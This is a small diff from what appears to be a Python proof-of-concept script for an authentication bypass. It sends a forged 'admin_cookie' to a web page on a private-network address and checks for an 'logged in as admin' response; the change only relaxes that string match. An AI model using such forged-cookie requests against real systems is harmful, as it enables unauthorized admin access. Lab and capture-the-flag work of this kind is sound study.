@@ -34,7 +34,7 @@ print("[+] New request with new cookie")
 
 cookies = {'auth=': 'admin_cookie'}
 req = requests.get('http://192.168.0.111/index.php', cookies=cookies)
-if "logged in as admin!" in req.text:
+if "logged in as admin" in req.text:
     print("[+] successfully logged as admin")
     sys.exit(-1)
 
